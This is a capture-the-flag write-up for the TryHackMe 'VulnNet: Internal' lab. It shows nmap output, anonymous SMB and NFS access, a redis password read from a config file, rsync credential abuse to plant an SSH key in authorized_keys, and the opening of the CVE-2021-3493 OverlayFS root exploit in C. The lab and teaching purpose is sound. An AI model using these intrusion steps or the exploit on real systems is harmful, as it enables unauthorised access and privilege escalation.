<!DOCTYPE html><html lang="en-gb"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>TryHackMe Writeup — VulnNet Internal - Offens!ve Blogs</title><meta name="description" content="VulnNet: Internal is a Easy/Medium level Box. It includes enumerating&hellip;"><meta name="generator" content="Publii Open-Source CMS for Static Site"><script type="gdpr-blocker/" async src="https://www.googletagmanager.com/gtag/js?id=G-439DSW1VB5"></script><script type="gdpr-blocker/">window.dataLayer = window.dataLayer || [];
				  function gtag(){dataLayer.push(arguments);}
				  gtag('js', new Date());
				  gtag('config', 'G-439DSW1VB5' , { 'anonymize_ip': true });
				  <!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-439DSW1VB5"></script><script>window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-439DSW1VB5');</script><link rel="canonical" href="https://sakibulalikhan.github.io/tryhackme-writeup-vulnnet-internal.html"><link rel="alternate" type="application/atom+xml" href="https://sakibulalikhan.github.io/feed.xml"><link rel="alternate" type="application/json" href="https://sakibulalikhan.github.io/feed.json"><meta property="og:title" content="TryHackMe Writeup — VulnNet Internal - Offens!ve Blogs "><meta property="og:image" content="https://sakibulalikhan.github.io/media/posts/1/vulnnetinternal.jpg"><meta property="og:image:width" content="512"><meta property="og:image:height" content="512"><meta property="og:site_name" content="Offens!ve Blogs"><meta property="og:description" content="VulnNet: Internal is a Easy/Medium level Box. It includes enumerating&hellip;"><meta property="og:url" content="https://sakibulalikhan.github.io/tryhackme-writeup-vulnnet-internal.html"><meta property="og:type" content="article"><meta name="twitter:card" content="summary"><meta name="twitter:site" content="@sakibulalikhan"><meta name="twitter:title" content="TryHackMe Writeup — VulnNet Internal - Offens!ve Blogs "><meta name="twitter:description" content="VulnNet: Internal is a Easy/Medium level Box. It includes enumerating&hellip;"><meta name="twitter:image" content="https://sakibulalikhan.github.io/media/posts/1/vulnnetinternal.jpg"><link rel="shortcut icon" href="https://sakibulalikhan.github.io/media/website/download.png" type="image/png"><link rel="shortcut icon" href="https://sakibulalikhan.github.io/media/website/download.png" type="image/png"><link rel="stylesheet" href="https://sakibulalikhan.github.io/assets/css/style.css?v=d9c8ddd41d5e6bc78fbf1f52183ebdff"><script type="application/ld+json">{"@context":"http://schema.org","@type":"Article","mainEntityOfPage":{"@type":"WebPage","@id":"https://sakibulalikhan.github.io/tryhackme-writeup-vulnnet-internal.html"},"headline":"TryHackMe Writeup — VulnNet Internal","datePublished":"2023-08-19T01:54","dateModified":"2023-08-25T00:04","image":{"@type":"ImageObject","url":"https://sakibulalikhan.github.io/media/posts/1/vulnnetinternal.jpg","height":512,"width":512},"description":"VulnNet: Internal is a Easy/Medium level Box. It includes enumerating&hellip;","author":{"@type":"Person","name":"Sakibul Ali Khan","url":"https://sakibulalikhan.github.io/authors/sakibulalikhan/"},"publisher":{"@type":"Organization","name":"Sakibul Ali Khan","logo":{"@type":"ImageObject","url":"https://sakibulalikhan.github.io/media/website/web-logo.png","height":53,"width":204}}}</script><noscript><style>img[loading] {
                    opacity: 1;
                }</style></noscript><script defer="defer" src="https://unpkg.com/@tinybirdco/flock.js" data-host="https://api.tinybird.co" data-token="p.eyJ1IjogIjM2YjRmY2Y4LWZhNDYtNGJjMy05MjlkLTFlMmY2ZjBlNGJmMSIsICJpZCI6ICIwZTIzODY1YS02NmY3LTQzODItOTkwOS1jYWEyMjZlZGJmNjEiLCAiaG9zdCI6ICJldV9zaGFyZWQifQ.tDBlzPIX9n77oyAJj53_z9_o0htQ9qO4v6g-ahPBRnk"></script></head><body><script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="sakibulalikhan" data-description="Support me on Buy me a coffee!" data-message="" data-color="#FF5F5F" data-position="Right" data-x_margin="18" data-y_margin="18"></script><header class="header" id="js-header"><a href="https://sakibulalikhan.github.io/" class="logo"><img src="https://sakibulalikhan.github.io/media/website/web-logo.png" alt="Offens!ve Blogs" width="204" height="53"></a><nav class="navbar js-navbar"><button class="navbar__toggle js-toggle" aria-label="Menu"><span class="navbar__toggle-box"><span class="navbar__toggle-inner">Menu</span></span></button><ul class="navbar__menu"><li><a href="https://sakibulalikhan.github.io/" target="_self">Home</a></li><li><a href="https://sakibulalikhan.github.io/about.html" target="_self">About Me</a></li><li><a href="https://sakibulalikhan.github.io/tags/ctf-writeup/" target="_self">CTF Writeups</a></li><li><a href="https://sakibulalikhan.github.io/contact.html" target="_self">Contact Me</a></li></ul></nav></header><main><div class="wrapper"><article class="post"><header class="post__header"><a href="https://sakibulalikhan.github.io/tags/tryhackme/" class="post__maintag">Tryhackme</a><h1 class="post__title">TryHackMe Writeup — VulnNet Internal</h1><div class="post__meta"><div class="post__author">By <a href="https://sakibulalikhan.github.io/authors/sakibulalikhan/" class="invert" rel="author" title="Sakibul Ali Khan">Sakibul Ali Khan</a></div><time datetime="2023-08-19T01:54">August 19, 2023</time><div class="post__comments"><a href="https://sakibulalikhan.github.io/tryhackme-writeup-vulnnet-internal.html#comments" rel="nofollow" aria-label="Comments"><svg aria-hidden="true"><title>Comments</title><use xlink:href="https://sakibulalikhan.github.io/assets/svg/svg-map.svg#comments"/></svg></a></div></div></header><figure class="post__featured-image"><img src="https://sakibulalikhan.github.io/media/posts/1/vulnnetinternal.jpg" srcset="https://sakibulalikhan.github.io/media/posts/1/responsive/vulnnetinternal-xs.jpg 300w, https://sakibulalikhan.github.io/media/posts/1/responsive/vulnnetinternal-sm.jpg 480w, https://sakibulalikhan.github.io/media/posts/1/responsive/vulnnetinternal-md.jpg 768w, https://sakibulalikhan.github.io/media/posts/1/responsive/vulnnetinternal-lg.jpg 1200w" sizes="(min-width: 56.25em) 100vw, (min-width: 37.5em) 50vw, 100vw" loading="eager" height="512" width="512" alt="TryHackMe Writeup — VulnNet Internal"></figure><div class="post__inner"><div class="post__entry"><p id="dc75" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph=""><strong class="ly kz">VulnNet: Internal</strong> is a Easy/Medium level Box. It includes enumerating different services and finding useful information to gain user access. For privilege escalation we have to use port forwarding to access TeamCity service and then we can run commands as root user.</p><p id="7e0a" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">TryHackMe Room Link: <a class="af rn" href="https://tryhackme.com/room/vulnnetinternal" rel="noopener ugc nofollow" target="_blank">https://tryhackme.com/room/vulnnetinternal</a></p><h4><strong>There are four flags that need to be submitted in order to complete the challenge:</strong></h4><ol><li>Service Flag</li><li>Internal Flag</li><li>User Flag</li><li>Root Flag</li></ol><h1>Enumeration</h1><p id="ac8b" class="pw-post-body-paragraph xw xx tu ly b xy abh ya yb yc abi ye yf li abj yh yi ln abk yk yl ls abl yn yo yp fp bj" data-selectable-paragraph="">We start the enumeration with a <code class="ff abm abn abo abp b">nmap</code> scan to look for open ports and running services</p><blockquote class="abq abr abs"><p id="08fc" class="xw xx abt ly b xy xz ya yb yc yd ye yf abu yg yh yi abv yj yk yl abw ym yn yo yp fp bj" data-selectable-paragraph="">Nmap Scan</p></blockquote><pre class="yq yr ys yt yu abx abp aby abz ax gf bj"><span id="095a" class="ze zf tu abp b fr aca acb l acc acd" data-selectable-paragraph="">❯ nmap -A -vv 10.10.96.14 &gt;nmap<br>.<br>.<br>.<br>NSE: Loaded 155 scripts for scanning.<br>NSE: Script Pre-scanning.<br>NSE: Starting runlevel 1 (of 3) scan.<br>Initiating NSE at 07:08<br>Completed NSE at 07:08, 0.00s elapsed<br>NSE: Starting runlevel 2 (of 3) scan.<br>Initiating NSE at 07:08<br>Completed NSE at 07:08, 0.00s elapsed<br>NSE: Starting runlevel 3 (of 3) scan.<br>Initiating NSE at 07:08<br>Completed NSE at 07:08, 0.00s elapsed<br>Initiating Ping Scan at 07:08<br>Scanning 10.10.96.14 [2 ports]<br>Completed Ping Scan at 07:08, 0.20s elapsed (1 total hosts)<br>Initiating Parallel DNS resolution of 1 host. at 07:08<br>Completed Parallel DNS resolution of 1 host. at 07:08, 0.03s elapsed<br>Initiating Connect Scan at 07:08<br>Scanning 10.10.96.14 [1000 ports]<br>Discovered open port 139/tcp on 10.10.96.14<br>Discovered open port 111/tcp on 10.10.96.14<br>Discovered open port 22/tcp on 10.10.96.14<br>Discovered open port 445/tcp on 10.10.96.14<br>Discovered open port 2049/tcp on 10.10.96.14<br>Discovered open port 873/tcp on 10.10.96.14<br>Increasing send delay for 10.10.96.14 from 0 to 5 due to max_successful_tryno increase to 4<br>Completed Connect Scan at 07:09, 34.33s elapsed (1000 total ports)<br>Initiating Service scan at 07:09<br>Scanning 6 services on 10.10.96.14<br>Completed Service scan at 07:09, 11.66s elapsed (6 services on 1 host)<br>NSE: Script scanning 10.10.96.14.<br>NSE: Starting runlevel 1 (of 3) scan.<br>Initiating NSE at 07:09<br>Completed NSE at 07:09, 6.47s elapsed<br>NSE: Starting runlevel 2 (of 3) scan.<br>Initiating NSE at 07:09<br>Completed NSE at 07:09, 0.43s elapsed<br>NSE: Starting runlevel 3 (of 3) scan.<br>Initiating NSE at 07:09<br>Completed NSE at 07:09, 0.00s elapsed<br>Nmap scan report for 10.10.96.14<br>Host is up, received conn-refused (0.21s latency).<br>Scanned at 2022–01–15 07:08:47 EST for 53s<br>Not shown: 990 closed tcp ports (conn-refused)<br>PORT STATE SERVICE REASON VERSION<br>22/tcp open ssh syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>| 2048 5e:27:8f:48:ae:2f:f8:89:bb:89:13:e3:9a:fd:63:40 (RSA)<br>| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDagA3GVO7hKpJpO1Vr6+z3Y9xjoeihZFWXSrBG2MImbpPH6jk+1KyJwQpGmhMEGhGADM1LbmYf3goHku11Ttb0gbXaCt+mw1Ea+K0H00jA0ce2gBqev+PwZz0ysxCLUbYXCSv5Dd1XSa67ITSg7A6h+aRfkEVN2zrbM5xBQiQv6aBgyaAvEHqQ73nZbPdtwoIGkm7VL9DATomofcEykaXo3tmjF2vRTN614H0PpfZBteRpHoJI4uzjwXeGVOU/VZcl7EMBd/MRHdspvULJXiI476ID/ZoQLT2zQf5Q2vqI3ulMj5CB29ryxq58TVGSz/sFv1ZBPbfOl9OvuBM5BTBV<br>| 256 f4:fe:0b:e2:5c:88:b5:63:13:85:50:dd:d5:86:ab:bd (ECDSA)<br>| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNM0XfxK0hrF7d4C5DCyQGK3ml9U0y3Nhcvm6N9R+qv2iKW21CNEFjYf+ZEEi7lInOU9uP2A0HZG35kEVmuideE=<br>| 256 82:ea:48:85:f0:2a:23:7e:0e:a9:d9:14:0a:60:2f:ad (ED25519)<br>|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJPRO3XCBfxEo0XhViW8m/V+IlTWehTvWOyMDOWNJj+i<br>111/tcp open rpcbind syn-ack 2–4 (RPC #100000)<br>| rpcinfo: <br>| program version port/proto service<br>| 100000 2,3,4 111/tcp rpcbind<br>| 100000 2,3,4 111/udp rpcbind<br>| 100000 3,4 111/tcp6 rpcbind<br>| 100000 3,4 111/udp6 rpcbind<br>| 100003 3 2049/udp nfs<br>| 100003 3 2049/udp6 nfs<br>| 100003 3,4 2049/tcp nfs<br>| 100003 3,4 2049/tcp6 nfs<br>| 100005 1,2,3 47846/udp6 mountd<br>| 100005 1,2,3 51893/tcp mountd<br>| 100005 1,2,3 52114/udp mountd<br>| 100005 1,2,3 54049/tcp6 mountd<br>| 100021 1,3,4 39323/udp nlockmgr<br>| 100021 1,3,4 41673/tcp nlockmgr<br>| 100021 1,3,4 41907/tcp6 nlockmgr<br>| 100021 1,3,4 59210/udp6 nlockmgr<br>| 100227 3 2049/tcp nfs_acl<br>| 100227 3 2049/tcp6 nfs_acl<br>| 100227 3 2049/udp nfs_acl<br>|_ 100227 3 2049/udp6 nfs_acl<br>139/tcp open netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)<br>445/tcp open netbios-ssn syn-ack Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)<br>873/tcp open rsync syn-ack (protocol version 31)<br>1086/tcp filtered cplscrambler-lg no-response<br>2049/tcp open nfs_acl syn-ack 3 (RPC #100227)<br>3945/tcp filtered emcads no-response<br>9090/tcp filtered zeus-admin no-response<br>56738/tcp filtered unknown no-response<br>Service Info: Host: VULNNET-INTERNAL; OS: Linux; CPE: cpe:/o:linux:linux_kernel<br>Host script results:<br>|_clock-skew: mean: -6h20m03s, deviation: 34m38s, median: -6h00m03s<br>| nbstat: NetBIOS name: VULNNET-INTERNA, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)<br>| Names:<br>| VULNNET-INTERNA&lt;00&gt; Flags: &lt;unique&gt;&lt;active&gt;<br>| VULNNET-INTERNA&lt;03&gt; Flags: &lt;unique&gt;&lt;active&gt;<br>| VULNNET-INTERNA&lt;20&gt; Flags: &lt;unique&gt;&lt;active&gt;<br>| WORKGROUP&lt;00&gt; Flags: &lt;group&gt;&lt;active&gt;<br>| WORKGROUP&lt;1e&gt; Flags: &lt;group&gt;&lt;active&gt;<br>| Statistics:<br>| 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00<br>| 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00<br>|_ 00 00 00 00 00 00 00 00 00 00 00 00 00 00<br>| smb2-time: <br>| date: 2022–01–15T06:09:31<br>|_ start_date: N/A<br>| smb2-security-mode: <br>| 3.1.1: <br>|_ Message signing enabled but not required<br>| smb-security-mode: <br>| account_used: guest<br>| authentication_level: user<br>| challenge_response: supported<br>|_ message_signing: disabled (dangerous, but default)<br>| p2p-conficker: <br>| Checking for Conficker.C or higher…<br>| Check 1 (port 53408/tcp): CLEAN (Couldn't connect)<br>| Check 2 (port 34685/tcp): CLEAN (Couldn't connect)<br>| Check 3 (port 9485/udp): CLEAN (Failed to receive data)<br>| Check 4 (port 22333/udp): CLEAN (Failed to receive data)<br>|_ 0/4 checks are positive: Host is CLEAN or ports are blocked<br>| smb-os-discovery: <br>| OS: Windows 6.1 (Samba 4.7.6-Ubuntu)<br>| Computer name: vulnnet-internal<br>| NetBIOS computer name: VULNNET-INTERNAL\x00<br>| Domain name: \x00<br>| FQDN: vulnnet-internal</span></pre><p id="d113" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">As you can see, multiple ports are open and different services are running on each port. First let’s enumerate the SMB shares using the following command:</p><pre class="yq yr ys yt yu abx abp aby abz ax gf bj"><span id="5d8d" class="ze zf tu abp b fr aca acb l acc acd" data-selectable-paragraph="">❯ smbmap -H 10.10.96.14<br>[+] Guest session   	IP: 10.10.96.14:445	Name: 10.10.96.14                                       <br>        Disk                                                  	Permissions	Comment<br>	----                                                  	-----------	-------<br>	print$                                            	NO ACCESS	Printer Drivers<br>	shares                                            	READ ONLY	VulnNet Business Shares<br>	IPC$                                              	NO ACCESS	IPC Service (vulnnet-internal server (Samba, Ubuntu))</span></pre><h1 id="92aa" class="zn zf tu be zg zo zp zq ld zr zs zt lh zu zv zw zx zy zz aba abb abc abd abe abf abg bj" data-selectable-paragraph="">First Flag</h1><p id="3ca8" class="pw-post-body-paragraph xw xx tu ly b xy abh ya yb yc abi ye yf li abj yh yi ln abk yk yl ls abl yn yo yp fp bj" data-selectable-paragraph="">Now let’s try anonymous access on SMB share “shares” using the following command.</p><pre class="yq yr ys yt yu abx abp aby abz ax gf bj"><span id="89f1" class="ze zf tu abp b fr aca acb l acc acd" data-selectable-paragraph="">❯ smbclient //10.10.96.14/shares<br>Enter WORKGROUP\sak's password: <br>Try "help" to get a list of possible commands.<br>smb: \&gt; ls<br>  .                                         <br>  ..                                        <br>  temp                               <br>  data                               <br>smb: \&gt;</span></pre><p id="7cd5" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">We found three files in both temp and data directory and using the <code class="ff abm abn abo abp b">get</code> command we can download all the files in our local system. Just download all file and you got your first flag from those file.</p><p id="87c2" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Note: In one of the files we found our first flag. But the other two files didn’t have any useful information.</p><h1 id="5133" class="zn zf tu be zg zo zp zq ld zr zs zt lh zu zv zw zx zy zz aba abb abc abd abe abf abg bj" data-selectable-paragraph="">Second Flag</h1><p id="e4f1" class="pw-post-body-paragraph xw xx tu ly b xy abh ya yb yc abi ye yf li abj yh yi ln abk yk yl ls abl yn yo yp fp bj" data-selectable-paragraph="">Looking at the NMAP service scan from earlier, I saw that port 2049 was open and noticed that there was a lot of output for port 111. I can see in the output for port 111, that the service <strong class="ly kz">NFS </strong>was present in the output. This indicates that I might be able to list and download (and maybe upload) files.</p><pre class="yq yr ys yt yu abx abp aby abz ax gf bj"><span id="07fb" class="ze zf tu abp b fr aca acb l acc acd" data-selectable-paragraph="">❯ sudo showmount -e 10.10.96.14<br>[sudo] password for sak: <br>Export list for 10.10.96.14:<br>/opt/conf *</span></pre><p id="4638" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Now we need to mount <code class="ff abm abn abo abp b">/opt/conf</code> in our local directory, and for that we need to create a mount point (directory) with the name mount0.</p><p id="3d88" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">While traversing different directories we found something interesting in the <code class="ff abm abn abo abp b">redis</code> directory , <code class="ff abm abn abo abp b">redis.conf</code> contains the password for <code class="ff abm abn abo abp b">redis</code>.</p><pre class="yq yr ys yt yu abx abp aby abz ax gf bj"><span id="1494" class="ze zf tu abp b fr aca acb l acc acd" data-selectable-paragraph="">❯ cat redis.conf | grep "pass"<br># 2) No password is configured.<br># If the master is password protected (using the "requirepass" configuration<br># masterauth &lt;master-password&gt;<br>requirepass "B65Hx562F*****"<br>.<br>.<br>.</span></pre><p id="ead5" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Now we can access <code class="ff abm abn abo abp b">redis</code> using <code class="ff abm abn abo abp b">redis-cli</code> utility using the following command:</p><pre class="yq yr ys yt yu abx abp aby abz ax gf bj"><span id="2016" class="ze zf tu abp b fr aca acb l acc acd" data-selectable-paragraph="">❯ redis-cli -h 10.10.96.14 -p 6379 -a "B65Hx562F****"<br>Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.<br>10.10.96.14:6379&gt;</span></pre><blockquote class="abq abr abs"><p id="b8f1" class="xw xx abt ly b xy xz ya yb yc yd ye yf abu yg yh yi abv yj yk yl abw ym yn yo yp fp bj" data-selectable-paragraph="">In here -h (IP) &amp; -a(Password)</p></blockquote><p id="1543" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">To get all the keys in <code class="ff abm abn abo abp b">redis</code>, we can run the command <code class="ff abm abn abo abp b">KEYS *</code>.</p><pre class="yq yr ys yt yu abx abp aby abz ax gf bj"><span id="b46f" class="ze zf tu abp b fr aca acb l acc acd" data-selectable-paragraph="">10.10.96.14:6379&gt; KEYS * 1) "int" 2) "internal flag" 3) "authlist" 4) "tmp" 5) "marketlist" 10.10.96.14:6379&gt;</span></pre><p id="c96e" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Our second flag is present in the file named <code class="ff abm abn abo abp b">internal flag</code> and we can read it using the command:</p><pre class="yq yr ys yt yu abx abp aby abz ax gf bj"><span id="79a3" class="ze zf tu abp b fr aca acb l acc acd" data-selectable-paragraph="">GET "internal flag"</span></pre><h1 id="207d" class="zn zf tu be zg zo zp zq ld zr zs zt lh zu zv zw zx zy zz aba abb abc abd abe abf abg bj" data-selectable-paragraph="">User Flag</h1><p id="ce1d" class="pw-post-body-paragraph xw xx tu ly b xy abh ya yb yc abi ye yf li abj yh yi ln abk yk yl ls abl yn yo yp fp bj" data-selectable-paragraph="">To find the type of a key in redis we run the command “type &lt;key_name&gt;”</p><pre class="yq yr ys yt yu abx abp aby abz ax gf bj"><span id="5e83" class="ze zf tu abp b fr aca acb l acc acd" data-selectable-paragraph="">10.10.96.14:6379&gt; type authlist<br>list</span></pre><p id="52c6" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">We found that <code class="ff abm abn abo abp b">authlist</code> is a list type key and to read it's value we can run the following command:</p><pre class="yq yr ys yt yu abx abp aby abz ax gf bj"><span id="fe66" class="ze zf tu abp b fr aca acb l acc acd" data-selectable-paragraph="">10.10.96.14:6379&gt; lrange authlist 1 10<br>1) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4**************************"<br>.<br>.<br>.</span></pre><blockquote class="abq abr abs"><p id="c37e" class="xw xx abt ly b xy xz ya yb yc yd ye yf abu yg yh yi abv yj yk yl abw ym yn yo yp fp bj" data-selectable-paragraph="">In here we got four base64 message.</p></blockquote><p id="1ef6" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">After decoding this base64 message, we found the credentials for rsync.</p><blockquote class="abq abr abs"><p id="de66" class="xw xx abt ly b xy xz ya yb yc yd ye yf abu yg yh yi abv yj yk yl abw ym yn yo yp fp bj" data-selectable-paragraph=""><strong class="ly kz"><em class="tu">N.B.</em></strong><em class="tu"> rsync is a utility for efficiently transferring and synchronizing files between a computer and an external hard drive and across networked computers.</em></p></blockquote><p id="14c8" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Rsync, or Remote Sync, is a free command-line tool that lets you transfer files and directories to local and remote destinations. Rsync is used for mirroring, performing backups, or migrating data to other servers.</p><p id="fcfc" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">To get name of all the files or directories we can use the following command:</p><pre class="yq yr ys yt yu abx abp aby abz ax gf bj"><span id="ed12" class="ze zf tu abp b fr aca acb l acc acd" data-selectable-paragraph="">$rsync -av rsync://rsync-connect@10.10.96.14/files/sys-internal/<br>Password: <br>receiving incremental file list<br>created directory /sys-internal/</span></pre><p id="04db" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">After the command is executed, all the files will be copied in <strong class="ly kz">/sys-internal/</strong> directory in our local system and there we found the user flag.</p><blockquote class="abq abr abs"><p id="fe50" class="xw xx abt ly b xy xz ya yb yc yd ye yf abu yg yh yi abv yj yk yl abw ym yn yo yp fp bj" data-selectable-paragraph="">Or you also use this command.</p></blockquote><pre class="yq yr ys yt yu abx abp aby abz ax gf bj"><span id="5777" class="ze zf tu abp b fr aca acb l acc acd" data-selectable-paragraph="">$ rsync rsync://rsync-connect@10.10.96.14/files/sys-internal/ user.txt .</span></pre><h1 id="3c26" class="zn zf tu be zg zo zp zq ld zr zs zt lh zu zv zw zx zy zz aba abb abc abd abe abf abg bj" data-selectable-paragraph="">User Shell Access</h1><p id="4212" class="pw-post-body-paragraph xw xx tu ly b xy abh ya yb yc abi ye yf li abj yh yi ln abk yk yl ls abl yn yo yp fp bj" data-selectable-paragraph="">While enumerating <code class="ff abm abn abo abp b">sys-internal</code> files and directories, we found <code class="ff abm abn abo abp b">.ssh</code> directory and we know that using <code class="ff abm abn abo abp b">rsync</code> we can upload files. So we upload our <code class="ff abm abn abo abp b">id_rsa.pub</code> to the <code class="ff abm abn abo abp b">.ssh</code> directory using the command shown below.</p><pre class="yq yr ys yt yu abx abp aby abz ax gf bj"><span id="2337" class="ze zf tu abp b fr aca acb l acc acd" data-selectable-paragraph="">❯ rsync /home/sak/.ssh/id_rsa.pub rsync://rsync-connect@10.10.96.14/files/sys-internal/.ssh/authorized_keys<br>Password:<br>.<br>.<br>.<br>sent 661 bytes  received 144 bytes  84.74 bytes/sec<br>total size is 565  speedup is 0.70</span></pre><p id="f459" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Now we can easily get user shell access by using <code class="ff abm abn abo abp b">id_rsa</code> private key.</p><pre class="yq yr ys yt yu abx abp aby abz ax gf bj"><span id="01a6" class="ze zf tu abp b fr aca acb l acc acd" data-selectable-paragraph="">❯ sudo ssh sys-internal@10.10.96.14 -i /home/sak/.ssh/id_rsa<br>[sudo] password for sak: .<br>.<br>.<br>.<br>sys-internal@vulnnet-internal:~$ id<br>uid=1000(sys-internal) gid=1000(sys-internal) groups=1000(sys-internal),24(cdrom)</span></pre><p id="88c3" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Now we have a SSH access to the target machine.</p><h1 id="30e9" class="zn zf tu be zg zo zp zq ld zr zs zt lh zu zv zw zx zy zz aba abb abc abd abe abf abg bj" data-selectable-paragraph="">Privilege Escalation</h1><blockquote class="abq abr abs"><p id="2259" class="xw xx abt ly b xy xz ya yb yc yd ye yf abu yg yh yi abv yj yk yl abw ym yn yo yp fp bj" data-selectable-paragraph="">In here I upload “linpias.sh” script to identify What type of command I can run. I find os vertion “ubuntu 18.4”. we all know it have</p><p id="b4ee" class="xw xx abt ly b xy xz ya yb yc yd ye yf abu yg yh yi abv yj yk yl abw ym yn yo yp fp bj" data-selectable-paragraph="">— OverlayFS PE <strong class="ly kz">Vulnerability.</strong></p><p id="801b" class="xw xx abt ly b xy xz ya yb yc yd ye yf abu yg yh yi abv yj yk yl abw ym yn yo yp fp bj" data-selectable-paragraph="">Reference Link <a class="af rn" href="https://ssd-disclosure.com/ssd-advisory-overlayfs-pe/" rel="noopener ugc nofollow" target="_blank">https://ssd-disclosure.com/ssd-advisory-overlayfs-pe/</a></p><p id="eb20" class="xw xx abt ly b xy xz ya yb yc yd ye yf abu yg yh yi abv yj yk yl abw ym yn yo yp fp bj" data-selectable-paragraph=""><strong class="ly kz">CVE</strong></p><p id="f8d0" class="xw xx abt ly b xy xz ya yb yc yd ye yf abu yg yh yi abv yj yk yl abw ym yn yo yp fp bj" data-selectable-paragraph="">CVE-2021–3493</p></blockquote><p id="283b" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">So, we can get root privilege by this <strong class="ly kz">Exploit-</strong></p><pre class="yq yr ys yt yu abx abp aby abz ax gf bj"><span id="73ae" class="ze zf tu abp b fr aca acb l acc acd" data-selectable-paragraph="">#define _GNU_SOURCE<br>#include &lt;stdio.h&gt;<br>#include &lt;stdlib.h&gt;<br>#include &lt;string.h&gt;<br>#include &lt;unistd.h&gt;<br>#include &lt;fcntl.h&gt;<br>#include &lt;err.h&gt;<br>#include &lt;errno.h&gt;<br>#include &lt;sched.h&gt;<br>#include &lt;sys/types.h&gt;<br>#include &lt;sys/stat.h&gt;<br>#include &lt;sys/wait.h&gt;<br>#include &lt;sys/mount.h&gt;<br><br>//#include &lt;attr/xattr.h&gt;<br>//#include &lt;sys/xattr.h&gt;<br>int setxattr(const char *path, const char *name, const void *value, size_t size, int flags);<br><br><br>#define DIR_BASE    "./ovlcap"<br>#define DIR_WORK    DIR_BASE "/work"<br>#define DIR_LOWER   DIR_BASE "/lower"<br>#define DIR_UPPER   DIR_BASE "/upper"<br>#define DIR_MERGE   DIR_BASE "/merge"<br>#define BIN_MERGE   DIR_MERGE "/magic"<br>#define BIN_UPPER   DIR_UPPER "/magic"<br><br><br>static void xmkdir(const char *path, mode_t mode)<br>{<br>    if (mkdir(path, mode) == -1 &amp;&amp; errno != EEXIST)<br>        err(1, "mkdir %s", path);<br>}<br><br>static void xwritefile(const char *path, const char *data)<br>{<br>    int fd = open(path, O_WRONLY);<br>    if (fd == -1)<br>        err(1, "open %s", path);<br>    ssize_t len = (ssize_t) strlen(data);<br>    if (write(fd, data, len) != len)<br>        err(1, "write %s", path);<br>    close(fd);<br>}<br><br>static void xcopyfile(const char *src, const char *dst, mode_t mode)<br>{<br>    int fi, fo;<br><br>    if ((fi = open(src, O_RDONLY)) == -1)<br>        err(1, "open %s", src);<br>    if ((fo = open(dst, O_WRONLY | O_CREAT, mode)) == -1)<br>        err(1, "open %s", dst);<br><br>    char buf[4096];<br>    ssize_t rd, wr;<br><br>    for (;;) {<br>        rd = read(fi, 